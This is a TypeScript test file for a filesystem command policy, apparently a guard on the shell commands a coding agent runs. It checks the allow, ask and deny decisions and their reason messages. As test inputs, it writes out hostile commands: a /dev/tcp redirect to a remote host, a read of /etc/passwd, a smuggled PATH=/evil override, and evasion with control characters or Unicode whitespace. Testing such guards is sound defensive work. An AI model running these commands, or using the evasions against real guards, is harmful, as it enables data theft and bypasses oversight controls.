import { describe, expect, it } from "bun:test";
import { homedir } from "node:os";

import { filesystemPolicy } from "../src/policies/filesystem/policy.ts";
import {
  askReason,
  injectionReason,
} from "../src/policies/filesystem/reasons.ts";
import { ALLOW, ASK, DENY } from "./fixtures/filesystem.ts";
import {
  decisionOf,
  decisionTableTests,
  policyCheck,
  reasonOf,
} from "./helpers/policy.ts";

describe("filesystem policy v2", () => {
  decisionTableTests(filesystemPolicy, { allow: ALLOW, ask: ASK, deny: DENY });

  it("fail-open: unparseable command allows", () => {
    expect(policyCheck(filesystemPolicy, 'cat "')).toBeNull();
  });

  it("allows reading the repo root from a package cwd (repo-in-$HOME scenario)", () => {
    const repo = `${homedir()}/www/repo`;
    expect(
      policyCheck(filesystemPolicy, "cat ../../README.md", {
        cwd: `${repo}/packages/cli-hook`,
        projectRoot: repo,
      }),
    ).toBeNull();
  });
});

describe("filesystem policy v2 (reasons)", () => {
  it("boundary denies quote the offending token", () => {
    expect(
      reasonOf(policyCheck(filesystemPolicy, "cat /etc/passwd")),
    ).toContain("/etc/passwd");
  });

  it("the injection reason quotes the matched pattern", () => {
    expect(
      reasonOf(
        policyCheck(filesystemPolicy, "echo x > /dev/tcp/10.0.0.1/8080"),
      ),
    ).toContain(injectionReason("/dev/tcp/"));
  });

  it("the PATH override beats non-ASCII whitespace in the guard precedence", () => {
    expect(
      reasonOf(
        policyCheck(filesystemPolicy, 'cat "x\u00A0y" PATH=/evil ls'),
      ),
    ).toBe(injectionReason("PATH override"));
  });

  it("control characters beat the PATH override in the guard precedence", () => {
    expect(
      reasonOf(policyCheck(filesystemPolicy, 'cat "x\u0001y" PATH=/evil ls')),
    ).toBe(injectionReason("control characters"));
  });

  it("the scanner's numeric whitespace set denies (U+00A0, U+2028, U+3000)", () => {
    expect(
      reasonOf(policyCheck(filesystemPolicy, "cat\u00A0file.txt")),
    ).toBe(injectionReason("non-ASCII whitespace"));
    expect(
      reasonOf(policyCheck(filesystemPolicy, "cat\u2028file.txt")),
    ).toBe(injectionReason("non-ASCII whitespace"));
    expect(
      reasonOf(policyCheck(filesystemPolicy, "cat\u3000file.txt")),
    ).toBe(injectionReason("non-ASCII whitespace"));
  });

  it("the /tmp deny reason teaches ./tmp/ at the project root", () => {
    expect(reasonOf(policyCheck(filesystemPolicy, "tee /tmp/x y"))).toContain(
      "./tmp/",
    );
  });

  it("the home-whole ask reason carries only the confirm instruction", () => {
    expect(reasonOf(policyCheck(filesystemPolicy, "ls ~"))).toBe(
      askReason("reading the home directory as a whole", "~"),
    );
  });
});

describe("context", () => {
  it("allows writes inside $HOME and inside projectRoot, denies outside the zone", () => {
    const zone = (command: string, cwd: string, projectRoot: string) =>
      decisionOf(policyCheck(filesystemPolicy, command, { cwd, projectRoot }));
    expect(zone("tee build/x x", "/proj/sub", "/proj")).toBeNull();
    expect(
      zone("tee /workspace/repo/x x", "/workspace/repo", "/workspace/repo"),
    ).toBeNull();
    expect(zone("tee /elsewhere/x x", "/proj/sub", "/proj")).toBe("deny");
  });
});

describe("filesystem policy (mutator flags)", () => {
  it("sed -i outside memory stays free inside the zone", () => {
    expect(
      decisionOf(
        policyCheck(filesystemPolicy, "sed -i 's/a/b/' ~/www/repo/f.ts"),
      ),
    ).toBeNull();
  });

  it("find -delete outside the zone denies", () => {
    expect(
      decisionOf(
        policyCheck(filesystemPolicy, "find /workspace -name x -delete"),
      ),
    ).toBe("deny");
  });
});
